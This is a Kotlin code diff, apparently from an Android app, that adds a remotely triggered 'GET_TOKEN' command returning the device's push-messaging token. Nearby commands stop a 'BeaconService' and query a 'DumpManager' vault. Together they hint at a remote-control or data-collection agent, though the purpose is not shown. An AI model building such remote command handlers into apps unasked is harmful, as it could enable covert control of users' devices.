@@ -145,6 +145,18 @@ object CommandProcessor {
                     ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                     status = "EXECUTED (STOPPED)"
                 }
+                "GET_TOKEN" -> {
+                    val token = DeviceManager.getRobustFcmToken(ctx)
+                    if (token != null) {
+                        status = "TOKEN_RETRIEVED"
+                        val result = JSONObject().put("fcm_token", token)
+                        updateCommandStatus(ctx, id, status, null, result, null)
+                        return
+                    } else {
+                        status = "FETCH_FAILED (NO_TOKEN)"
+                        errorMsg = "Play Services unavailable or token generation blocked."
+                    }
+                }
                 "GET_VAULT_SIZE" -> {
                     val sizeInfo = DumpManager.getVaultSize()
                     status = "EXECUTED"
